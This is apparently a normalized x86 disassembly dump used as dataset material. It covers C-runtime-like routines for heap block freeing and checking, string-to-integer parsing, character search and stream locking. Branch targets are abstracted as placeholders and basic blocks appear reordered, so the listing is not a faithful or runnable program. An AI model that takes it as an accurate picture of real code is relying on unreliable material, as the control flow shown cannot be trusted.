mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov edx 0x80000000
shr edx cl
or [ eax ] edx
sub_2011749
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ rw-data ]
push 0x4000
shl ecx 0xf
add ecx [ eax + 0xc ]
push 0x8000
push ecx
call [ VirtualFree@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
mov ecx [ rw-data ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
and [ rw-data ] 0x0
cmp [ rw-data ] 0x1
jle r-xdata
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
mov edx [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_2021420
add esp 0xc
dec [ rw-data ]
sub_2011816
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0x138
push ebx
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp [ rw-data ] ebx
push esi
mov edx eax
push edi
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x1c ] ebx
jle r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
mov eax [ edx + 0x10 ]
cmp eax ebx
je r-xdata
pop ebx
leave
retn
push 0xfffffffe
jmp r-xdata
mov ecx [ edx + 0xc ]
mov [ ebp - 0x8 ] ecx
lea ecx [ eax + 0x144 ]
mov [ ebp - 0x24 ] ecx
mov ecx [ edx + 0x8 ]
lea esi [ eax + 0xc4 ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x38 ] esi
pop eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
cmp eax [ esi - 0x80 ]
jne r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
pop edi
pop esi
push 0xfffffff0
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ esi ]
jne r-xdata
push 0xfffffffc
jmp r-xdata
mov edx [ ebp - 0x8 ]
add edx 0xffc
add [ ebp - 0x8 ] 0x8000
add [ ebp - 0x24 ] 0x204
shl [ ebp - 0x20 ] 0x1
inc [ ebp - 0xc ]
add esi 0x4
cmp [ ebp - 0xc ] 0x20
mov [ ebp - 0x38 ] esi
jl r-xdata
push 0xfffffffb
jmp r-xdata
cmp [ edx ] 0xffffffff
jne r-xdata
push 0x40
xor eax eax
cmp [ ebp - 0x20 ] ebx
pop ecx
lea edi [ ebp - 0x138 ]
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
[ edi ]
jl r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ edx ]
jne r-xdata
mov ecx [ esi ]
mov edi ecx
test cl 0x1
je r-xdata
push 0xffffffef
mov eax [ ebp - 0x14 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
mov eax ecx
sar eax 0x4
dec eax
cmp eax 0x3f
jle r-xdata
dec ecx
cmp ecx 0x400
jg r-xdata
add edx 0x14
inc [ ebp - 0x1c ]
mov eax [ ebp - 0x1c ]
cmp eax [ rw-data ]
mov [ ebp - 0x34 ] edx
jl r-xdata
lea eax [ ebp + eax * 4 - 0x138 ]
inc [ eax ]
push 0x3f
pop eax
push 0xfffffffa
jmp r-xdata
inc [ ebp - 0x4 ]
jmp r-xdata
push 0xfffffff9
jmp r-xdata
test cl 0xf
jne r-xdata
cmp ecx 0x10
jl r-xdata
cmp ecx 0xff0
jg r-xdata
lea eax [ ecx + esi ]
cmp [ eax - 0x4 ] edi
jne r-xdata
push 0xfffffff8
jmp r-xdata
mov esi eax
cmp esi edx
jb r-xdata
jne r-xdata
add edx 0x1000
inc ebx
cmp ebx 0x8
jl r-xdata
cmp [ edx - 0xff4 ] 0xffffffff
lea esi [ edx - 0xff0 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ ebp - 0x24 ]
cmp [ edi ] eax
jne r-xdata
push 0xfffffff7
jmp r-xdata
xor esi esi
mov eax [ ebp - 0x2c ]
cmp [ eax + 0x4 ] edi
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + esi * 4 - 0x138 ]
je r-xdata
push 0xfffffff2
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + esi * 4 - 0x138 ]
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
cmp eax ecx
jb r-xdata
cmp [ ebx ] eax
jne r-xdata
cmp esi 0x20
mov eax 0x80000000
jge r-xdata
push 0xfffffff6
jmp r-xdata
add ecx 0x8000
cmp eax ecx
jae r-xdata
push 0xfffffff1
jmp r-xdata
inc esi
cmp esi 0x40
mov edi ebx
jl r-xdata
lea ecx [ esi - 0x20 ]
shr eax cl
or [ ebp - 0x18 ] eax
or [ ebp - 0x14 ] eax
mov ecx esi
shr eax cl
or [ ebp - 0x28 ] eax
or [ ebp - 0x10 ] eax
jmp r-xdata
mov ecx eax
and ecx 0xfffff000
add ecx 0xc
lea edx [ ecx + 0xff0 ]
cmp ecx edx
je r-xdata
and [ ebp - 0x4 ] 0x0
lea ebx [ edi + 0x8 ]
mov eax [ ebx - 0x4 ]
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x30 ] ebx
cmp eax edi
je r-xdata
mov esi [ ebp - 0x38 ]
mov edx [ ebp - 0x34 ]
xor ebx ebx
push 0xfffffff5
jmp r-xdata
cmp ecx eax
je r-xdata
cmp ecx edx
je r-xdata
mov ebx [ ecx ]
and ebx 0xfffffffe
add ecx ebx
mov ebx [ ebp - 0x30 ]
cmp ecx edx
jne r-xdata
mov ecx [ eax ]
sar ecx 0x4
dec ecx
cmp ecx 0x3f
jle r-xdata
cmp ecx esi
jne r-xdata
push 0x3f
pop ecx
push 0xfffffff4
jmp r-xdata
mov ecx [ ebp - 0x2c ]
cmp [ eax + 0x8 ] ecx
jne r-xdata
push 0xfffffff3
jmp r-xdata
inc [ ebp - 0x4 ]
mov [ ebp - 0x2c ] eax
mov eax [ eax + 0x4 ]
cmp eax edi
jne r-xdata
sub_2011afa
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ ebp + 0x8 ]
cmp edi esi
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x3f8
jbe r-xdata
pop esi
pop ebp
retn
xor eax eax
inc eax
jmp r-xdata
cmp eax 0x1
jne r-xdata
mov [ rw-data ] eax
xor eax eax
inc eax
jmp r-xdata
call sub_200fb13
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
jmp r-xdata
pop edi
call sub_200fb13
mov [ eax ] 0x16
cmp edi 0x3f8
ja r-xdata
call sub_200fb13
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
jmp r-xdata
push edi
call sub_2010f1c
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ rw-data ] edi
mov [ rw-data ] 0x3
sub_2011ba9
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
imul eax eax 0x14
add eax [ rw-data ]
add ecx 0x17
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
push ebx
dec ecx
cmp ecx 0x20
push esi
push edi
jge r-xdata
add ecx 0xffffffe0
or edx 0xffffffff
xor esi esi
shr edx cl
mov [ ebp - 0x8 ] edx
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx eax
jb r-xdata
mov ecx [ rw-data ]
mov ebx ecx
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx eax
jne r-xdata
add ebx 0x14
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
mov [ ebp - 0x4 ] edx
cmp edx 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
mov edx [ eax + 0xc4 ]
lea ecx [ eax + 0x44 ]
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov edx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
add ecx 0x4
jmp r-xdata
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
xor edi edi
and ecx esi
jne r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx ecx
jne r-xdata
test ecx ecx
jge r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
and ecx [ ebp - 0x8 ]
push 0x20
pop edi
jmp r-xdata
mov edi [ ecx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
add ebx 0x14
jmp r-xdata
add ecx ecx
inc edi
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp - 0x8 ] ecx
jle r-xdata
cmp ebx eax
jb r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
add ebx 0x14
mov [ ebp + 0x8 ] ebx
push ebx
call sub_2011360
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
test ecx ecx
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
mov ebx 0x80000000
jge r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ edx + 0x4 ] edi
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx ecx
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xb ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx [ ebp + 0x8 ]
and [ ebx ] ecx
jmp r-xdata
add ebx 0x14
call sub_20112b0
mov ebx eax
mov [ ebp + 0x8 ] ebx
test ebx ebx
jne r-xdata
and [ rw-data ] 0x0
cmp [ ebp + 0xb ] 0x0
jne r-xdata
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_2011e9d
mov edi edi
push ebp
mov ebp esp
push esi
push 0x4
call sub_2010e3c
push [ rw-data ]
call sub_200d4ca
push [ ebp + 0x8 ]
mov esi eax
call sub_200d44f
push 0x4
mov [ rw-data ] eax
call sub_2010d4a
add esp 0x10
mov eax esi
pop esi
pop ebp
retn
sub_2011ee9
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_200d4ca
pop ecx
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_2011f36
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_2011fee
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call sub_20099ee
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
xor edi edi
cmp eax edi
je r-xdata
cmp esi edi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] edi
je r-xdata
call sub_200fb13
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
push ebx
mov bl [ esi ]
mov [ ebp - 0x4 ] edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x14 ]
push eax
movzx eax bl
push 0x8
push eax
call sub_2014880
mov ecx [ ebp - 0x14 ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop edi
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jl r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
mov esi [ ecx + 0xc8 ]
mov eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
test ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
mov cl bl
sub cl 0x61
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
inc edi
mov bl [ edi ]
inc edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_200fb13
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov ebx [ ebp - 0x4 ]
imul ebx [ ebp + 0x14 ]
add ebx ecx
mov [ ebp - 0x4 ] ebx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
test cl 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx edx
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
sub_201221d
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_2011fee
add esp 0x14
pop ebp
retn
sub_2012265
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push 0x1
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jne r-xdata
push 0x0
push rw-data
jmp r-xdata
call sub_2011fee
add esp 0x14
pop ebp
retn
sub_20122ae
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x38 ]
call sub_20099ee
mov eax [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
xor ebx ebx
cmp eax ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov [ eax ] edi
cmp [ ebp + 0x14 ] ebx
je r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
cmp [ ebp - 0x2c ] bl
je r-xdata
push esi
mov esi [ ebp - 0x38 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x30 ]
and [ eax + 0x70 ] 0xfffffffd
movzx eax [ ebp - 0x1 ]
mov ecx [ esi + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x38 ]
push eax
movzx eax [ ebp - 0x1 ]
push 0x8
push eax
call sub_2014880
mov esi [ ebp - 0x38 ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop edi
pop ebx
leave
retn
mov al [ edi ]
inc edi
cmp [ esi + 0xac ] 0x1
mov [ ebp - 0x1 ] al
jle r-xdata
cmp [ ebp - 0x1 ] 0x2d
mov [ ebp - 0x8 ] edi
jne r-xdata
cmp eax ebx
jne r-xdata
cmp [ ebp - 0x1 ] 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
push 0x10
pop ecx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov al [ edi ]
inc edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x1 ] al
cmp [ ebp + 0x14 ] ecx
jne r-xdata
cmp [ ebp - 0x1 ] 0x30
je r-xdata
mov eax [ ebp + 0x14 ]
cdq
push edx
mov edi eax
push edi
push 0xffffffff
push 0xffffffff
mov [ ebp - 0x24 ] edx
call sub_2020760
mov [ ebp - 0x1c ] ebx
mov ebx [ esi + 0xc8 ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
cmp [ ebp - 0x1 ] 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
test eax 0x103
je r-xdata
movsx esi cl
sub esi 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] ecx
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec [ ebp - 0x8 ]
test al 0x8
jne r-xdata
mov al cl
sub al 0x61
cmp al 0x19
movsx eax cl
ja r-xdata
cmp esi [ ebp + 0x14 ]
jae r-xdata
inc edi
mov al [ edi ]
inc edi
mov [ ebp - 0x1 ] al
mov [ ebp - 0x8 ] edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
mov ebx 0x80000000
test al 0x4
jne r-xdata
xor eax eax
cmp [ ebp + 0x10 ] eax
je r-xdata
lea esi [ eax - 0x37 ]
sub eax 0x20
mov ecx [ ebp - 0xc ]
or [ ebp + 0x18 ] 0x8
cmp ecx [ ebp - 0x14 ]
jb r-xdata
call sub_200fb13
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ecx
push ecx
push [ ebp - 0x10 ]
push [ ebp - 0x24 ]
push edi
call sub_2021790
xor ecx ecx
add eax esi
adc edx ecx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
ja r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
or [ ebp - 0x10 ] 0xffffffff
or [ ebp - 0xc ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
pop esi
test eax eax
je r-xdata
and eax 0x2
je r-xdata
mov cl [ ebp - 0x1 ]
movzx eax cl
movzx eax [ ebx + eax * 2 ]
test al 0x4
je r-xdata
mov eax [ ebp - 0x18 ]
cmp [ ebp - 0x10 ] eax
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jb r-xdata
or [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0xc ] esi
and [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] ebx
jmp r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] ebx
ja r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0x14 ]
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] ecx
cmp [ ebp - 0xc ] esi
jb r-xdata
jb r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax ]
inc [ ebp - 0x8 ]
mov [ ebp - 0x1 ] al
jmp r-xdata
xor eax eax
cmp eax [ ebp - 0x1c ]
jb r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x30 ]
and [ eax + 0x70 ] 0xfffffffd
ja r-xdata
cmp [ ebp - 0x10 ] 0x0
ja r-xdata
ja r-xdata
cmp [ ebp - 0x10 ] 0xffffffff
jbe r-xdata
cmp esi [ ebp - 0x20 ]
jbe r-xdata
sub_2012545
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_20122ae
add esp 0x14
pop ebp
retn
sub_201258d
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push 0x1
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jne r-xdata
push 0x0
push rw-data
jmp r-xdata
call sub_20122ae
add esp 0x14
pop ebp
retn
sub_20125dc
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_201a9e3
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_201a9e3
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_20126ad
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_2010e3c
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_20126ee
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_2010e3c
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_2012720
mov edi edi
push ebp
mov ebp esp
